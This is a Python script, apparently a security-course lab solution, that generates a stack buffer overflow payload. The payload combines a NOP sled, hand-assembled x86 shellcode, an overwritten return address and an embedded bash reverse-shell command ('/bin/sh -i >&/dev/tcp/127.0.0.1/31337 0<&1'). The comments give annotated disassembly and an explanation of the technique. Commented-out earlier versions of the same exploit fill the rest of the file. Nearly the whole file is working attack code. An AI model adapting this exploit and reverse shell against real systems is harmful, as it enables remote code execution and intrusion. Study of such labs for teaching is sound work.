#!/usr/bin/env python3

import sys
#from shellcode import shellcode
from struct import pack

# Your code here
"""
Our previous strategy was to input the command with spaces removed 
(ie. substitute all spaces with ! or @) and then iterate over the string to insert spaces 
and null charachters (to denote end of an argument); this was tedious and error prone.

The strategy we ended up using was to pack the bash commands into a bash script array
structure so as to avoid the pitfalls of the previous strategy. We still needed to insert 
null charachters and padding to denote the end of a string and prevent the shellcode/arguments 
from corrupting each other. Our strategy exploits the bash word splitting behavior to pre-parse
the bash args passed to execve into a format that is ready to be evaluated by the spawned shell. 

The command the new bash shell executes is:
"/bin/sh -i >&/dev/tcp/127.0.0.1/31337 0<&1"

The "/bin/sh -i" components spawns an instance of /bin/sh in interactive mode so it uses stdin 
and leads with '$' for input.

The ">&/dev/tcp/127.0.0.1/31337" component binds the spawned shell's stdout and stderr to the tcp
connection specified by /dev/tcp/127.0.0.1/31337.
The "0<&1" component binds the spawned shell's stdin to the file descriptor of the tcp connection 
because in Linux, *everything* is a file.

In C, the call to execve would be set up like this:
char* args[4];
args[0] = "/bin/bash";
args[1] = "-c";
args[2] = "arr=(eval);arr+=(\"${arr[@]}\");arr+=(\"/bin/sh\");arr+=(\"-i\");arr+=(\">&\");arr+=(\"/dev/tcp/127.0.0.1/31337\");arr+=(\"0<&1\");`${arr[@]}`";
args[3] = NULL;
execve(args[0], args, NULL);

The array references itself after the first entry using the special syntax 
"{arr[@]}" (quotes are needed to prevent bash word splitting). This tells bash to retrieve all
contents of the array, which are then passed to eval as argument. Then each argument is appended 
to the array. The last command, `${arr[@]}`, tells bash to execute the entire array as a 
command from the new shell we spawned with execve.
References: // All about Bash / Word Splitting / Command Substitution / Arrays
            https://linux.die.net/man/1/bash
            https://www.linuxjournal.com/content/bash-arrays
            https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html
            https://www.gnu.org/software/bash/manual/html_node/Word-Splitting.html
            // Linux device files / file-descriptor redirections / /dev/tcp
            https://tldp.org/LDP/abs/html/io-redirection.html
            https://tldp.org/LDP/abs/html/devref1.html
            https://catonmat.net/bash-one-liners-explained-part-three
            https://securityreliks.wordpress.com/2010/08/20/devtcp-as-a-weapon/
Annotated disassembly:
90              nop*37                // 37 nops to serve as nop sled (ommitted for conciseness)
31 c0           xor %eax, %eax        // clear eax
89 e5           mov %esp, %ebp        // set up new stack frame (dont push old ebp)
// set up args array for execve
83 c4 f0        add $-0x10, %esp      // create room on stack for the args to execve
bb 9f 8d fe ff  mov $0xfffe8d9f, %ebx // move address of "/bin/bash" string to ebx
83 c3 08        add $0x8, %ebx        // move toward end of the string
43              inc %ebx              // move to the real end (+9 in the previous step adds a nullbyte)
89 03           mov %eax, (%ebx)      // place a null charachter at end of string
bb 9f 8d fe ff  mov $0xfffe8d9f, %ebx // restore starting address of bash string to ebx
89 5d f0        mov %ebx, -0x10(%ebp) // move "/bin/bash\0" string to first index of execve args
bb ae 8d fe ff  mov $0xfffe8dae, %ebx // move start of "-c" string to ebx
83 c3 02        add $0x2, %ebx        // move to end of "-c" string
89 03           mov %eax, (%ebx)      // place a null char at end of "-c" string
bb ae 8d fe ff  mov $0xfffe8dae, %ebx // move start of "-c\0" string to ebx
89 5d f4        mov %ebx, -0xc(%ebp)  // move "-c\0" string to second entry of execve args
bb b6 8d fe ff  mov $0xfffe8db6, %ebx // move start of "arr=(eval);..." string into ebx
81 eb 7e ff ff ff sub $0xffffff7e, %ebx // subtract -130 from ebx to move to last index of string
89 03           mov %eax, (%ebx)      // place a null char at end of string
bb b6 8d fe ff  mov $0xfffe8db6, %ebx // move start of "arr=(eval);...\0" string into ebx
89 5d f8        mov %ebx, -0x8(%ebp)  // move ptr to string in ebx to third entry of execve args
31 db           xor %ebx, %ebx        // clear ebx
89 5d fc        mov %ebx, -0x4(%ebp)  // move 0 (NULL) to fourth entry of execve args

// time to set up call to execve
bb 9f 8d fe ff  mov $0xfffe8d9f, %ebx // move address of "/bin/bash\0" string into ebx
89 e9           mov %ebp, %ecx        // move args array into %ecx
83 c1 f0        add $-0x10, %ecx      // point ecx to start of args array by subtracting 16
31 d2           xor %edx, %edx        // clear edx (pass NULL as third argument to execve call)
6a 0b           push $0xb             // put execve call number (11) on the stack
58              pop %eax              // pop 0xb into %eax 
cd 80           int $0x80             // make the system call
83 c4 10        add $0x10, %esp       // clear args ptr from stack.. code shouldnt reach here.
"""

padding = (b'\x41')
ret_address = pack("<I", 0xfffe8ca8)
to_overwrite = pack("<I", 0xfffe8e4c)
bin_bash_addr = pack("<I", 0xfffe8d9f)
bin_sh_addr = pack("<I", 0xfffe8dae)
bin_bash = b'\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68'
tack = b'\x2d\x63'
tack_addr = pack("<I", 0xfffe8dae)
bin_sh = b'\x2f\x62\x69\x6e\x2f\x73\x68'
args_addr = pack("<I", 0xfffe8db6)
shellcode = b'\x90'*37
shellcode += b'\x31\xc0'
shellcode += b'\x50'*0
shellcode += b'\x89\xe5\x83\xc4\xf0'
shellcode += b'\xbb'+bin_bash_addr
shellcode += b'\x83\xc3\x08\x43\x89\x03'
shellcode += b'\xbb'+bin_bash_addr
shellcode += b'\x89\x5d\xf0'
shellcode += b'\xbb'+tack_addr
shellcode += b'\x83\xc3\x02'
shellcode += b'\x89\x03'
shellcode += b'\xbb'+tack_addr
shellcode += b'\x89\x5d\xf4'
shellcode += b'\xbb'+args_addr
shellcode += b'\x81\xeb\x7e\xff\xff\xff'
shellcode += b'\x89\x03\xbb'+args_addr
shellcode += b'\x89\x5d\xf8'
shellcode += b'\x31\xdb\x89\x5d\xfc'
shellcode += b'\xbb'+bin_bash_addr
shellcode += b'\x89\xe9\x83\xc1\xf0'
shellcode += b'\x31\xd2\x6a\x0b\x58\xcd\x80\x83\xc4\x10'

# This is the .data section and we want to use the addresses of this data on the stack to set up the call to execve.
data = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/bin/bashaaaaaa-caaaaaaarr=(eval);arr+=("${arr[@]}");arr+=("/bin/sh");arr+=("-i");arr+=(">&");arr+=("/dev/tcp/127.0.0.1/31337");arr+=("0<&1");`${arr[@]}`'

datab = bytes([ord(c) for c in data]) # convert data string into bytes representation
payload = (2048-len(shellcode)-len(datab)-80)*padding + shellcode +padding*80+datab + ret_address + to_overwrite
sys.stdout.buffer.write(payload)




















"""
IGNORE THIS BECAUSE IT WAS A COMPILATION OF TESTING/FAILED ATTEMPTS...
no_escape_args=\
b'\x61\x72\x72\x3d\x28\x65\x76\x61\x6c\x29\x3b\x61\x72\x72\x2b\x3d\x28\x5c\x22\x24\x7b\x61\x72\x72\x5b\x40\x5d\x7d\x5c\x22\x29\x3b\x61\x72\x72\x2b\x3d\x28\x5c\x22\x2f\x62\x69\x6e\x2f\x73\x68\x5c\x22\x29\x3b\x61\x72\x72\x2b\x3d\x28\x5c\x22\x2d\x69\x5c\x22\x29\x3b\x61\x72\x72\x2b\x3d\x28\x5c\x22\x3e\x26\x5c\x22\x29\x3b\x61\x72\x72\x2b\x3d\x28\x5c\x22\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x2f\x33\x31\x33\x33\x37\x5c\x22\x29\x3b\x61\x72\x72\x2b\x3d\x28\x5c\x22\x30\x3e\x26\x31\x5c\x22\x29\x3b\x60\x24\x7b\x61\x72\x72\x5b\x40\x5d\x7d\x60\x3b'
args=\
b'\x61\x72\x72\x3d\x28\x65\x76\x61\x6c\x29\x3b\x61\x72\x72\x2b\x3d\x28\x22\x24\x7b\x61\x72\x72\x5b\x40\x5d\x7d\x22\x29\x3b\x61\x72\x72\x2b\x3d\x28\x22\x2f\x62\x69\x6e\x2f\x73\x68\x22\x29\x3b\x61\x72\x72\x2b\x3d\x28\x22\x2d\x69\x22\x29\x3b\x61\x72\x72\x2b\x3d\x28\x22\x3e\x26\x22\x29\x3b\x61\x72\x72\x2b\x3d\x28\x22\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x2f\x33\x31\x33\x33\x37\x22\x29\x3b\x61\x72\x72\x2b\x3d\x28\x22\x30\x3e\x26\x31\x22\x29\x3b\x60\x24\x7b\x61\x72\x72\x5b\x40\x5d\x7d\x60\x3b'
args_addr = pack("<I", 0xffffd60f)
#shellcode =  b'\x89\xe5' 
"""
"""shellcode = b'\x89\xe5\x6a\x0b'
shellcode += b'\x58\x99\x58\x52' # pop %eax; cltd; push %edx

#shellcode =  b'\x55\x89\xe5' 
shellcode += b'\x83\xc4\xf0' # sub $-0x10, %esp
shellcode += b'\xbb'+bin_bash_addr
shellcode += b'\xb9'+bin_bash_addr
shellcode += b'\x89\x4d\xf0'

shellcode += b'\xba\x3c\x72\x11\x3e\x81\xf2\x11\x11\x11\x11'
#shellcode += b'\x89\x4d\xf0'
shellcode += b'\x89\x55\xf4'
#shellcode += b'\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x52\x89\xe1\x51\x83\xc1\x04'
#shellcode += b'\x68'+args_addr #\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x52\x89\xe1\x51\x83\xc1\x04'
#shellcode += b'\x89\xe1\x89\x4d\xf8'
shellcode += b'\xbf'+args_addr
shellcode += b'\x89\x7d\xf8'
#shellcode += b'\xc7\x45\xf8'+args_addr
shellcode += b'\x31\xd2\x89\x55\xfc\x89\xe9\x83\xc1\xf0'
#shellcode += b'\x52\x89\xe2'
shellcode += b'\x6a\x0b'            # push $0xb
shellcode += b'\x58'                # pop %eax
shellcode += b'\xcd\x80'            # int $0x80
shellcode += b'\x83\xc4\x10'

#shellcode += b'\x89\x55\xf4\x83\xc4\x04'
#shellcode += b'\xbe\x9d\x5c\x0c\x11\x81\xf6\x11\x11\x11\x11\x56'
#shellcode += b'\x89\xe6\x8f\x06'
#shellcode += b'\x89\x55\xf4'        # mov %edx, -0xc(%ebp)
shellcode = b'\x31\xc0\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x89\xe5\x83\xc4\xf0'
shellcode += b'\xbb'+bin_bash_addr
shellcode += b'\x31\xc0\x83\xc3\x08\x43\x89\x03'
shellcode += b'\xbb'+bin_bash_addr
shellcode += b'\x89\x5d\xf0'
shellcode += b'\xbb'+tack_addr
shellcode += b'\x83\xc3\x02\x89\x03'
shellcode += b'\xbb'+tack_addr
shellcode += b'\x89\x5d\xf4'
#shellcode += b'\x66\x68\x2d\x63'
#shellcode += b'\x66\x8b\x1c\x24'
#shellcode += b'\xbb\x3c\x72\x11\x3e\x81\xf3\x11\x11\x11\x11'
#shellcode += b'\xbb'+pack("<I", 0x1111723c)
#shellcode += b'\x81\xf3\x11\x11\x11\x11'
#shellcode += b'\xc1\xe3\x08\x53\x89\xe3'

#shellcode += b'\x89\x5d\xf4'
#shellcode += b'\x53\x89\x65\xf4\x83\xc4\x04'
shellcode += b'\xbb'+args_addr
shellcode += b'\x89\x5d\xf8'
shellcode += b'\x31\xdb\x89\x5d\xfc'
shellcode += b'\xbb'+bin_bash_addr
shellcode += b'\x89\xe9\x83\xc1\xf0'
shellcode += b'\x31\xd2\x6a\x0b\x58\xcd\x80'
payload = (2048-len(shellcode))*padding + shellcode + ret_address + to_overwrite\
 +bin_bash+(8*b'\x41')+tack+(8*b'\x41')+no_escape_args
sys.stdout.buffer.write(payload)
"""
"""bin_bash_addr = pack("<I", 0xffffde82)
bin_sh_addr = pack("<I", 0xffffd661)
bin_sh = b'\x2f\x62\x69\x6e\x2f\x73\x68\x03'
tack =  b'\x2d\x63\x00'
tack_addr = pack("<I", 0xffffd664)
args =  b'\x2f\x62\x69\x6e\x2f\x73\x68\x21\x2d\x69\x21'
args += b'\x3e\x26\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x31\x32\x37\x2e\x30\x2e\x30\x2e'
args += b'\x31\x2f\x33\x31\x33\x33\x37\x21\x30\x3e\x26\x31'
args_addr = pack("<I", 0xffffd674)
shellcode =  b'\x55\x89\xe5'     # push $0xb
shellcode += b'\x6a\x0b'#\x99\x52'
shellcode += b'\x58\x99\x52' # pop %eax; cltd; push %edx
shellcode += b'\xb8' + args_addr # mov $0xfffd675, %ebx
shellcode += b'\xbb' + args_addr
shellcode += b'\x66\x83\xc3\x07'     # add $0x8, %bx
shellcode += b'\x88\xd8'
shellcode += b'\xfe\x08'             # dec %al
shellcode += b'\x88\xc3'
shellcode += b'\x66\x83\xc3\x03'        # add $0x3, %bx
shellcode += b'\x88\xd8'
shellcode += b'\xfe\x08'             # dec %al
shellcode += b'\x88\xc3'
shellcode += b'\x66\x83\xc3\x1b'     # add $27, %bx
shellcode += b'\x88\xd8'         # mov (%bx), %al
shellcode += b'\xfe\x08'             # dec %al
shellcode += b'\x88\xc3'        # mov %al, (%bx)
shellcode += b'\xb8' + args_addr # mov $0xfffd675, %ebx

shellcode += b'\x83\xc4\xf0' # add $0xfffffff0, %esp
#shellcode += b'\x50'
#shellcode += b'\x89\x45\xf8'

shellcode += b'\xb9' + bin_sh_addr
shellcode += b'\xbb' + bin_sh_addr
shellcode += b'\x80\xc1\x07'
shellcode += b'\x88\xcb\x31\xc9\x88\x0b'


shellcode += b'\xba\x3c\x72\x11\x3e\x81\xf2\x11\x11\x11\x11'
shellcode += b'\x52\x89\xe2'

#shellcode += b'\x89\x55\xf4\x83\xc4\x04'
#shellcode += b'\xbe\x9d\x5c\x0c\x11\x81\xf6\x11\x11\x11\x11\x56'
shellcode += b'\x89\xe6\x8f\x06'
shellcode += b'\x89\x55\xf4'        # mov %edx, -0xc(%ebp)
shellcode += b'\x89\x45\xf8'        # mov %eax, -0x8(%ebp)
shellcode += b'\xb9'+bin_sh_addr
#shellcode += b'\xbb'+bin_sh_addr
shellcode += b'\x51\x8b\x0c\x24'
#shellcode += b'\x89\x4d\xf0'         # mov %ecx, -0x10(%ebp)

shellcode += b'\x31\xd2'             # xor %edx, %edx
shellcode += b'\x89\x55\xfc'         # mov %edx, -0x4(%ebp)
shellcode += b'\xbb'+bin_bash_addr
shellcode += b'\x89\xe9'             # mov %ebp, %ecx
shellcode += b'\x83\xc1\xf0'         # add $0xfffffff0, %ecx
shellcode += b'\x83\xc4\x08\x52'
shellcode += b'\xbf'+args_addr
shellcode += b'\x6a\x0b'            # push $0xb
shellcode += b'\x58'                # pop %eax
shellcode += b'\xcd\x80'            # int $0x80
shellcode += b'\x83\xc4\x10'
payload = (2048-len(shellcode))*padding + shellcode +padding*0+ ret_address + to_overwrite\
 + bin_sh + (b'\x08')+bin_bash+args


sys.stdout.buffer.write(payload)
"""
